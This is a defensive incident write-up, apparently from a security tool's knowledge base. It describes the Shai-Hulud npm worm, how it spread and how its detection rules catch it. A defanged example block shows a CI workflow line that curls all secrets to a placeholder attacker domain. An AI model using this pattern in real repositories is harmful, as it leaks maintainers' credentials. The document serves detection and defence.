# Shai-Hulud (first wave)

**Type:** Package & maintainer takeover · **When:** about 14 to 15 Sept 2025 · **Status:** confirmed

## What happened
Shai-Hulud was a self-spreading npm worm, first seen in `@ctrl/tinycolor` (2.2M weekly downloads). It stole secrets and republished every package the victim could publish. It also pushed workflows into the victim's GitHub repos. It grew from 180+ to about 500 packages. It is assessed as downstream of the Aug 2025 [Nx compromise](nx-s1ngularity.md).

## How it got in
1. A postinstall ran `node bundle.js`.
2. It dumped the environment and ran TruffleHog to find secrets.
3. With an npm token, it republished every package that victim could publish (the worm step).
4. It pushed a GitHub Actions workflow to reachable repos that sent repo secrets to a public webhook-capture service (webhook[.]site).
5. It created a public `Shai-Hulud` repo holding stolen secrets. 64 more repos got a `shai-hulud` branch.
6. A script (`/tmp/migrate-repos.sh`) copied private org repos into public repos with a `-migration` suffix (created private first).

## Why it was hard to spot
- Pushes came from the real victim's account.
- When the webhook was shut down, the secrets were still in workflow logs.
- Wiz first saw 36 users with exposed secrets and 8 whose private repos were made public.

## Signs to look for
- In one change: a new `postinstall`; a new workflow that reads many secrets and posts them out.
- Across changes over time: the same workflow pushed to many repos by one account; new repos named `*-migration`; private repos made public.

## Defanged example
```
.github/workflows/<name>.yml:
  on: push
  run: curl -d "<all secrets>" https://<attacker-domain>
new repo: <victim>/<repo>-migration   (public)
```

## How Pushguard catches it
- **Diff rules:** `js-install-hook-added`, `ci-workflow-changed`, `ci-secret-exfiltration`.
- **Settings events:** a repo made public files a critical alert.
- **Identity & review context:** `ci-agent-shaped-push`, `unreviewed-push-to-main`, `branch_created`.
- Linking the same push across many repos is not built. New `-migration` repos are not alerted on.
- See [GhostAction](../ci-cd/ghostaction.md) for the same workflow-push pattern.

## References
- [Wiz (search-summary)](https://www.wiz.io/de-de/blog/shai-hulud-npm-supply-chain-attack)
- [Wiz](https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack)
- [Truesec (search-summary)](https://truesec.com/hub/blog/500-npm-packages-compromised-in-ongoing-supply-chain-attack-shai-hulud)
- [Xygeni (search-summary)](https://xygeni.io/?p=62663)
